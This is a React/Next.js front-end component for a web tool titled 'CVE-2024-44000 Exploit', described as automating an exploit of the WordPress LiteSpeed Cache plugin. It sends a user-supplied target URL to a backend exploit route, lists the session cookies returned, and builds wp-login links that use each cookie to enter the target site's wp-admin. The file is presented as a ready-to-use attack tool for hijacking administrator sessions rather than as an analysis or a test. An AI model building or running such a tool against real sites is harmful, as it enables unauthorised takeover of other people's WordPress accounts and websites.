"use client";
import CardTools from "@/components/card/cardTools";
import BtnSubmit from "@/components/button/btnSubmit";
import * as Uil from "@iconscout/react-unicons";
import { useState, useEffect, useRef } from "react";
import Link from "next/link";

function CSR() {
  const [target, setTarget] = useState("");
  const [loading, setLoading] = useState(false);
  const [isDisabled, setIsDisabled] = useState(true);
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);
  const [isCopy, setIsCopy] = useState(null);
  const resultRef = useRef(null);

  useEffect(() => {
    const isValid = target !== "" && (target.startsWith("https://") || target.startsWith("http://"));

    setIsDisabled(!isValid);
  }, [target]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setIsDisabled(true);
    setResult(null);
    setError(null);

    const response = await fetch("/api/cve202444000", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ target }),
    });

    const data = await response.json();
    if (response.ok) {
      setResult(data.data);
    } else {
      setError(data.error);
    }
    setLoading(false);
    setIsDisabled(false);
    resultRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  const handleCopy = async (e, item, index) => {
    e.preventDefault();
    await navigator.clipboard.writeText(item);
    setIsCopy(index);
    setTimeout(() => setIsCopy(null), 2000);
  };

  return (
    <CardTools title="CVE-2024-44000 Exploit" description="Tools for automated exploit CVE-2024-44000 WordPress LiteSpeed Cache Plugin.">
      <form onSubmit={handleSubmit} className="flex flex-col gap-4 w-full p-1 md:p-4">
        <label className="input input-bordered flex items-center gap-2 w-full">
          <Uil.UilLinkH size="16px" className="h-4 w-4 opacity-70" />
          <input type="text" className={`grow w-full ${loading && "cursor-not-allowed"}`} id="target" name="target" value={target} onChange={(e) => setTarget(e.target.value)} required placeholder="https://localhost/" readOnly={loading} />
        </label>
        <BtnSubmit loading={loading} isDisabled={isDisabled} innerText="Execute" />
      </form>
      <div className="divider my-0" ref={resultRef}></div>
      {error && <span className="w-full text-error">{error}</span>}
      {result && (
        <div className="flex flex-col gap-4 w-full">
          {result.map((item, index) => {
            const link = target.startsWith("https://") || target.startsWith("http://") ? target : `http://${target}`;

            return (
              <Link
                href={`${link}/wp-login.php?redirect_to=${encodeURIComponent(`${target}/wp-admin/`)}&reauth=1&cookie=${item}`}
                className="p-4 flex justify-between items-center hover:shadow-2xl transition-shadow gap-4 rounded-2xl border border-white w-full"
                key={index}
                id={`cookie-${index}`}
              >
                Cookie {index + 1} {isCopy === index ? <Uil.UilCheck size="14px" color="#eab308" /> : <Uil.UilClipboard size="14px" color="#eab308" onClick={(e) => handleCopy(e, item, index)} />}
              </Link>
            );
          })}
        </div>
      )}
    </CardTools>
  );
}

export default CSR;
